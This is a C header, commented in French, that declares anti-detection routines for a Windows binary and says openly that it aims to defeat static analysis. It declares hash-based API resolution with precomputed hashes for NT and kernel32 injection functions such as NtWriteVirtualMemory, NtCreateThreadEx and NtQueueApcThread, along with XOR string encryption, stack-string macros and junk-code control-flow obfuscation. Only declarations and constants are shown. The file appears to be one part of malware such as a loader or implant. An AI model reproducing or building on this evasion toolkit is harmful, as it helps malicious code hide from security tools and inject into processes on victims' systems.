/*
 * obfuscation.h - Techniques d'obfuscation
 *
 * API hashing, string encryption, control flow obfuscation
 * Évite la détection par analyse statique des binaires
 */

#ifndef OBFUSCATION_H
#define OBFUSCATION_H

#include <windows.h>

/* =========================================================================
 * Algorithmes de hashing
 * ========================================================================= */

DWORD Hash_DJB2(const char* str);
DWORD Hash_DJB2_CI(const char* str);
DWORD Hash_SDBM(const char* str);
DWORD Hash_FNV1a(const char* str);
DWORD Hash_ROT13_XOR(const char* str, DWORD key);
DWORD Hash_Custom(const char* str, DWORD seed);

/* =========================================================================
 * API Resolution par hash
 * ========================================================================= */

HMODULE API_GetModuleByHash(DWORD moduleHash);
FARPROC API_GetProcByHash(HMODULE module, DWORD funcHash);
FARPROC API_Resolve(DWORD moduleHash, DWORD funcHash);
FARPROC API_ResolvePrecomputed(DWORD moduleHash, DWORD funcHash);
void API_ClearCache(void);
DWORD API_HashString(const char* str);
BOOL API_DumpHashes(char** outJson);

/* =========================================================================
 * Hashes pré-calculés - Modules (DJB2 case-insensitive)
 * ========================================================================= */

#define HASH_NTDLL          0x6A4ABC5B
#define HASH_KERNEL32       0x6DDB9555
#define HASH_KERNELBASE     0x5B8ACA33
#define HASH_USER32         0x63C84283
#define HASH_ADVAPI32       0x5EAFD6E3

/* =========================================================================
 * Hashes pré-calculés - Fonctions NT
 * ========================================================================= */

#define HASH_NtAllocateVirtualMemory    0xF783B8EC
#define HASH_NtProtectVirtualMemory     0x50E92888
#define HASH_NtWriteVirtualMemory       0xC3170192
#define HASH_NtReadVirtualMemory        0xA4B2E3E7
#define HASH_NtCreateThreadEx           0xAF18CFB0
#define HASH_NtQueueApcThread           0x28EB3AF9
#define HASH_NtClose                    0x50193A25

/* =========================================================================
 * Hashes pré-calculés - Fonctions Kernel32
 * ========================================================================= */

#define HASH_VirtualAlloc               0x91AFCA54
#define HASH_VirtualFree                0x30633AC
#define HASH_VirtualProtect             0x7946C61B
#define HASH_LoadLibraryA               0xB7072FF1
#define HASH_GetProcAddress             0x7802F749
#define HASH_CreateThread               0x544E6104
#define HASH_WaitForSingleObject        0x601D8708

/* =========================================================================
 * String Encryption
 * ========================================================================= */

void String_XOR_Decrypt(char* str, DWORD len, BYTE key);
void String_XOR_DecryptKey(char* str, DWORD len, const BYTE* key, DWORD keyLen);
void String_RollingXOR_Decrypt(char* str, DWORD len, BYTE initialKey);

typedef struct _ENCRYPTED_STRING {
    DWORD length;
    BYTE key;
    char data[1];
} ENCRYPTED_STRING, *PENCRYPTED_STRING;

char* String_Decrypt(PENCRYPTED_STRING encStr);
char* String_DecryptToStack(const BYTE* encrypted, DWORD len, BYTE key, char* buffer);

/* =========================================================================
 * Stack Strings
 * ========================================================================= */

void GetNtdllString(char* buffer);
void GetKernel32String(char* buffer);
void GetVirtualAllocString(char* buffer);

/* Macros pour stack strings */
#define STACK_STRING_2(name, c1, c2) \
    char name[3]; name[0]=c1; name[1]=c2; name[2]=0;

#define STACK_STRING_4(name, c1, c2, c3, c4) \
    char name[5]; name[0]=c1; name[1]=c2; name[2]=c3; name[3]=c4; name[4]=0;

#define STACK_STRING_8(name, c1, c2, c3, c4, c5, c6, c7, c8) \
    char name[9]; name[0]=c1; name[1]=c2; name[2]=c3; name[3]=c4; \
    name[4]=c5; name[5]=c6; name[6]=c7; name[7]=c8; name[8]=0;

/* =========================================================================
 * Compile-time encryption helpers
 * ========================================================================= */

#define COMPILE_TIME_KEY() ((BYTE)(__TIME__[0] ^ __TIME__[1] ^ __TIME__[3] ^ __TIME__[4] ^ __TIME__[6] ^ __TIME__[7]))
#define ENC_CHAR(c, key) ((char)((c) ^ (key)))

/* =========================================================================
 * Control Flow Obfuscation
 * ========================================================================= */

BOOL OpaquePredicate_True(void);
BOOL OpaquePredicate_False(void);
void JunkCode_1(void);
void JunkCode_2(void);

#endif /* OBFUSCATION_H */
